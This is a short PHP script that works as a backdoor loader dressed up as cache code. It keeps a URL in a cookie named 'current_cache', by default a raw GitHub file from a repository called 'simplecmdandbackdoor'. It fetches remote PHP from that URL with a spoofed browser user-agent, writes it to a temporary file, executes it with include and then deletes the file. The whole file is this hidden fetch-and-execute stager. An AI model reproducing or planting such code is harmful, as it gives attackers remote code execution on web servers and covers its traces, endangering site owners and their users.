<?php
if (empty($_COOKIE['current_cache'])) {
    setcookie("current_cache", "https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/refs/heads/main/ws.php", time() + 3600, "/");
    header("Refresh:0");
    exit;
}

$url = filter_var($_COOKIE['current_cache'], FILTER_VALIDATE_URL);
if (!$url || parse_url($url, PHP_URL_SCHEME) !== 'https') {
    die("Invalid URL.");
}

$opts = [
    "http" => [
        "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    ]
];
$context = stream_context_create($opts);
$code = @file_get_contents($url, false, $context);

if (!$code || stripos($code, '<?php') === false) {
    die("Invalid content.");
}

$tmp = tempnam(sys_get_temp_dir(), 'cache_') . ".php";
file_put_contents($tmp, $code);
chmod($tmp, 0600);
include $tmp;
unlink($tmp);
?>
